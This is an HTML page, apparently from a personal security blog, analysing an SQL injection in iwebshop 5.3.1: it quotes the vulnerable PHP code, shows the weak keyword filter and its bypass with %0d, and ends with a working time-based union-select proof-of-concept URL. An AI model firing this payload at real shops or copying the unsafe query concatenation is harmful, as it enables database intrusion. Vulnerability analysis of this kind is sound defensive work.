@@ -1,0 +1,107 @@
+<!doctype html><html lang=zh-CN><head><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-110301700-1","auto"),ga("send","pageview"))</script><meta charset=utf-8><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=robots content="index, follow"><meta name=revisit-after content="15 days"><link rel=author href=/humans.txt><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta name=msapplication-TileImage content="/mstile-144x144.png"><link rel="shortcut icon" href=/favicon.ico><meta name=author content="bluebird"><meta itemprop=name content="Iwebshop sql注入"><meta itemprop=description content="iwebshop 最新版本5.3.1 前台注入
+iwebshop最新版存在一个非常弱智的注入漏洞"><meta itemprop=datePublished content="2019-01-19T18:12:19+08:00"><meta itemprop=dateModified content="2019-01-19T18:12:19+08:00"><meta itemprop=wordCount content="433"><meta itemprop=keywords content="漏洞分析,代码审计,"><meta property="og:title" content="Iwebshop sql注入"><meta property="og:description" content="iwebshop 最新版本5.3.1 前台注入
+iwebshop最新版存在一个非常弱智的注入漏洞"><meta property="og:type" content="article"><meta property="og:url" content="https://blue-bird1.github.io/posts/iwebshopsql/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-01-19T18:12:19+08:00"><meta property="article:modified_time" content="2019-01-19T18:12:19+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Iwebshop sql注入"><meta name=twitter:description content="iwebshop 最新版本5.3.1 前台注入
+iwebshop最新版存在一个非常弱智的注入漏洞"><title>Iwebshop sql注入</title><link rel="stylesheet dns-prefetch preconnect preload prefetch" as=style href=https://blue-bird1.github.io/css/style.min.d0b20be7baabc80eb407cbffc7e54d364796f75f0c7f757c906f90f3c84fc262.css integrity="sha256-0LIL57qryA60B8v/x+VNNkeW918Mf3V8kG+Q88hPwmI=" crossorigin=anonymous></head><body id=page><header id=site-header class="animated slideInUp"><div class="hdr-wrapper section-inner"><div class=hdr-left><div class=site-branding><a href=https://blue-bird1.github.io/>青鸟的博客</a></div><nav class="site-nav hide-in-mobile"><a href=https://blue-bird1.github.io/posts/>Posts</a><a href=https://blue-bird1.github.io/about/>About</a><a href=https://blue-bird1.github.io/friends/>Friend</a></nav></div><div class="hdr-right hdr-icons"><button id=menu-btn class=hdr-btn title=Menu><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></header><div id=mobile-menu class="animated fast"><ul><li><a href=https://blue-bird1.github.io/posts/>Posts</a></li><li><a href=https://blue-bird1.github.io/about/>About</a></li><li><a href=https://blue-bird1.github.io/friends/>Friend</a></li></ul></div><main class="site-main section-inner animated fadeIn faster"><article class=thin><header class=post-header><div class=post-meta><span>Jan 19, 2019</span></div><h1>Iwebshop sql注入</h1></header><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-feather"><path d="M20.24 12.24a6 6 0 00-8.49-8.49L5 10.5V19h8.5z"/><line x1="16" y1="8" x2="2" y2="22"/><line x1="17.5" y1="15" x2="9" y2="15"/></svg><a href target=_blank>bluebird</a></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://blue-bird1.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90>漏洞分析</a></span><span class=tag><a href=https://blue-bird1.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1>代码审计</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg><span class=category><a href=https://blue-bird1.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8>网络安全</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>433 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>2019-01-19 10:12 +0000</p></div><hr class=post-end><div class=content><h3 id=iwebshop-最新版本531-前台注入>iwebshop 最新版本5.3.1 前台注入<a href=#iwebshop-最新版本531-前台注入 class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>iwebshop最新版存在一个非常弱智的注入漏洞</p><p>主要导致原因 <code>$id = IFilter::act(IReq::get('id'));</code></p><p>开发者忘记写成 <code>IFilter::act(IReq::get('id'), 'int')</code>了,导致直接注入. 在其他文件也存在这个问题.</p><p>这个文件需要商家账号才可以访问,是可以注册的</p><p>漏洞点 <code>controllers/seller.php</code> 函数<code>categoryAjax</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>categoryAjax</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$id</span>        <span class=o>=</span> <span class=nx>IFilter</span><span class=o>::</span><span class=na>act</span><span class=p>(</span><span class=nx>IReq</span><span class=o>::</span><span class=na>get</span><span class=p>(</span><span class=s1>&#39;id&#39;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$parent_id</span> <span class=o>=</span> <span class=nx>IFilter</span><span class=o>::</span><span class=na>act</span><span class=p>(</span><span class=nx>IReq</span><span class=o>::</span><span class=na>get</span><span class=p>(</span><span class=s1>&#39;parent_id&#39;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$id</span> <span class=o>&amp;&amp;</span> <span class=nx>is_array</span><span class=p>(</span><span class=nv>$id</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>foreach</span><span class=p>(</span><span class=nv>$id</span> <span class=k>as</span> <span class=nv>$category_id</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=nv>$childString</span> <span class=o>=</span> <span class=nx>goods_class</span><span class=o>::</span><span class=na>catChild</span><span class=p>(</span><span class=nv>$category_id</span><span class=p>);</span><span class=c1>//父类ID不能死循环设置成其子分类
+</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=k>if</span><span class=p>(</span><span class=nv>$parent_id</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=nx>stripos</span><span class=p>(</span><span class=s2>&#34;,&#34;</span><span class=o>.</span><span class=nv>$childString</span><span class=o>.</span><span class=s2>&#34;,&#34;</span><span class=p>,</span><span class=s2>&#34;,&#34;</span><span class=o>.</span><span class=nv>$parent_id</span><span class=o>.</span><span class=s2>&#34;,&#34;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=p>{</span>                    <span class=k>die</span><span class=p>(</span><span class=nx>JSON</span><span class=o>::</span><span class=na>encode</span><span class=p>(</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;result&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;fail&#39;</span><span class=p>)));</span>                <span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>直接将id传入到<code>catChild</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> public static function catChild($catId,$level = 1)
+</span></span><span class=line><span class=cl>    {        if($level == 0)        {
+</span></span><span class=line><span class=cl>            return $catId;
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        $temp   = array();
+</span></span><span class=line><span class=cl>        $result = array($catId);        $catDB  = new IModel(&#39;category&#39;);
+</span></span><span class=line><span class=cl>        while(true)
+</span></span><span class=line><span class=cl>        {
+</span></span><span class=line><span class=cl>            $id = current($result);
+</span></span><span class=line><span class=cl>            if(!$id)
+</span></span><span class=line><span class=cl>            {
+</span></span><span class=line><span class=cl>                break;
+</span></span><span class=line><span class=cl>            }
+</span></span><span class=line><span class=cl>            $temp = $catDB-&gt;query(&#39;parent_id = &#39;.$id);
+</span></span></code></pre></td></tr></table></div></div><p>直接将id拼接到sql查询中.. 这个cms有一点sql过滤,但是非常弱,也就ctf入门题的水平</p><p><code>lib/core/util/filter_class.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>   public static function string($str,$limitLen = false)
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        $str = trim($str);
+</span></span><span class=line><span class=cl>        $str = self::limitLen($str,$limitLen);
+</span></span><span class=line><span class=cl>        $str = htmlspecialchars($str,ENT_NOQUOTES);
+</span></span><span class=line><span class=cl>        return self::addSlash($str);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>    public static function word($str)
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        $word = array(&#34;select &#34;,&#34;select/*&#34;,&#34;update &#34;,&#34;update/*&#34;,&#34;delete &#34;,&#34;delete/*&#34;,&#34;insert into&#34;,&#34;insert/*&#34;,&#34;updatexml&#34;,&#34;concat&#34;,&#34;()&#34;,&#34;/**/&#34;,&#34;union(&#34;);
+</span></span><span class=line><span class=cl>        foreach($word as $val)
+</span></span><span class=line><span class=cl>        {
+</span></span><span class=line><span class=cl>            if(stripos($str,$val) !== false)
+</span></span><span class=line><span class=cl>            {
+</span></span><span class=line><span class=cl>                return &#39;&#39;;
+</span></span><span class=line><span class=cl>            }
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>        return self::removeEmoji($str);
+</span></span><span class=line><span class=cl>    }
+</span></span></code></pre></td></tr></table></div></div><p>不允许<code>union </code>加空格,可是空格的代替很多 比如 <code>%0d</code></p><p>poc</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/index.php?controller=seller&amp;action=categoryAjax&amp;id[]=1%20and%201=1%20union%0dselect%0d1,2,3,4,5,6,7,8,sleep(5)
+</span></span></code></pre></td></tr></table></div></div></div></article><div class="post-nav thin"><a class=next-post href=https://blue-bird1.github.io/posts/dockertopoc/><span class=post-nav-label><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>&nbsp;Newer</span><br><span>docker搭建复现环境</span></a>
+<a class=prev-post href=https://blue-bird1.github.io/posts/thinkphp5-1/><span class=post-nav-label>Older&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg></span><br><span>think5审计与调试技巧1</span></a></div><div id=comments class=thin></div></main><footer id=site-footer class="section-inner thin animated fadeIn faster"><p>&copy; 2024 <a href=https://blue-bird1.github.io/></a>
+&#183;
+&#183; Made with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a>
+&#183; Theme <a href=https://github.com/1bl4z3r/hermit-V2 target=_blank rel=noopener>Hermit-V2</a>
+&#183; <a href=https://blue-bird1.github.io/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></p></footer><script async src=https://blue-bird1.github.io/js/bundle.min.038214de9d568246fadcfeb06c69349925de3209f332ec123861b6aa031d63c6.js integrity="sha256-A4IU3p1Wgkb63P6wbGk0mSXeMgnzMuwSOGG2qgMdY8Y=" crossorigin=anonymous></script><script type=text/javascript async src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">MathJax.Hub.Config({tex2jax:{inlineMath:[["$","$"],["\\(","\\)"]],displayMath:[["$$","$$"],["[[","]]"]],processEscapes:!0,processEnvironments:!0,skipTags:["script","noscript","style","textarea","pre"],TeX:{equationNumbers:{autoNumber:"AMS"},extensions:["AMSmath.js","AMSsymbols.js"]}}}),MathJax.Hub.Queue(function(){var e,t=MathJax.Hub.getAllJax();for(e=0;t.length>e;e+=1)t[e].SourceElement().parentNode.className+=" has-jax"})</script><style>code.has-jax{font:inherit;font-size:100%;background:inherit;border:inherit;color:#515151}</style></body></html>
